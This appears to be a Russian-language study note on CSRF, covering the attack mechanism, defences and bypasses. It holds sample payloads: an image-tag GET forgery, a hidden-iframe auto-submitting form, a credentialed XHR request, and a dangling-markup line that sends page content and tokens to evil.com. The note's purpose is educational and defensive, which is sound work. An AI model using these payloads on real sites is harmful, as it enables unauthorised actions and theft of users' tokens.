# Сross Site Request Forgery

**CSRF** - атака, эксплуатирующая недостатки протокола **HTTP**. 

# Механизм

Ресурс `example.com` - доверенный, пользователь на нем авторизован,  
`evil.com` - ресурс атакующего.

1. Пользователь заходит на `evil.com`
2. В фоне отправляется запрос на `example.com`, при этом в запросе есть авторизационные данные, например **Cookie**
3. На доверенном ресурсе осуществляется вредоносная операция.

Также к **CSRF** относят редирект на **Reflected XSS**.

## Эксплуатация

### GET

`<img src="http://bank.example.com/withdraw?account=Alice&amount=1000000&for=Bob">`

При загрузке страницы уйдет **GET** запрос на `bank.example.com`  

### POST

    <iframe style="display:none" name="csrf-frame"></iframe>
    <form method='POST' action='http://vulnerablesite.com/form.php' target="csrf-frame" id="csrf-form">
      <input type='hidden' name='criticaltoggle' value='true'>
      <input type='submit' value='submit'>
    </form>
    <script>document.getElementById("csrf-form").submit()</script>

При загрузке страницы уйдет **POST** запрос на `http://vulnerablesite.com/form.php`. При этом незаметный для пользователя, для этого используется `iframe`.

### XHR POST

    var request = new XMLHttpReequest();
    var data = "bla=123,blabla=312";

    request.open("POST", "http://example.com/method", true);
    request.withCredentials = true;
    request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    request.send(data);

`withCredentials` - отправляет **Cookie**,  

`Content-type: application/x-www-form-urlencoded`,  
`Content-type: text/plain`,  
`Content-type: application/form-data` - **SOP** разрешает "простые"

## Защита

Выделяют несколько способов:  

* **CSRF**-токен - рассмотрим далее
* **Double submit cookie** - дублирование токена из **Cookie** в параметрах запроса
* **Content-type based** - принимать строго заданный **Content-type**, но не "простые"
* **Referer based** - проверять заголовок **Referer**, но заголовка может не быть легко, поэтому не рекомендуется
* **SameSite Cookie** - параметр **Cookie**, не позволяющий отправлять их с другого домена, но поддерживается не везде

### CSRF токен

1. Генерирует высокоэнтропийный токен для пользовательской сессии
2. Доставляем надежным источником: в **DOM** или через **API**
3. Пользователь с запросом присылает токен в заголовках или параметром

В итоге для **CSRF** нужно сначала угнать токен

## Обход защиты

Наиболее простые:  

* **XSS** - все понятно
* **Subdomain Takeover** - все понятно
* **Dangink markup** - допустим можем в **XSS** пропихнуть **HTML**, но не **JS**, тогда:  

`<img src="http://evil.com/?html=`

и в итоге содержимое страницы уйдет на `evil.com` и если **CSRF**-токен был в **DOM** после уязвимого `input`, то токен будет получен.

[← Назад](../README.md)